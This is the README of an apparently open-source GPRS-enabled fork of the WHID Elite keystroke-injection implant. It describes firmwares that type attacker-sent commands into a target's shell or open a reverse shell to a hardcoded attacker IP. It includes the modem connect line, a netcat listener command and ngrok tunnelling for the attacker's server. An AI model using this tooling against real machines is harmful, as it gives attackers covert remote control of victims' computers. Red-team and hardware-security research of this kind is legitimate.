# GPRS WHID
This project is a fork of the whid elite. 
It extend the inital attack by integrating GPRS connection to it.  
This attack was designed to run on a modified version of the whid Elite with an Atmel Samd instead of an Atmel mega 32U4. 
## Hardware
TODO 
## Firmwares 
### Organisation 
This project provide various attacks each in a different folder: 
- The ``keystoke-injection`` provide a firmware that will open a shell on the target and only write on it every commands received via TCP.
- The ``testserial`` firmware can be used to check the serial connection between the whid and a computer.
- The ``reverseshell-qwerty`` will establish a complete reverse shell between the target and the attacker. It will connect to the hardcoded ip provided in the code and write a payload on the target. 
- The ``reverseshell-AZERTY`` does the same thing but with an  AZERTY target. 
- Inside ``Server`` it is work in progress for the server side of the TCP TUnnel 



### Requirement 
#### Whid side  
- Arduino SAMD boards drivers v1.6.12
- Keyboard Library
- Adafruit Fona Library 

On th .ino file, you will need to add your public IP address and the port your are listenning on: 
```CPP
if(!fona.sendCheckReply("AT+CIPSTART=\"TCP\",\"IPV4 Adress\",\"PORT\"",F("OK"),100))
```
#### Server side 
You need to setup a TCP server available behind a public IPV4 address. Netcat can do it easily:
```bash
netcat -lntvp <port>
```
If you don't have a public IPV4, you can use ngrok.io : 
```bash
ngrok.io => ./ngrok tcp <port>
```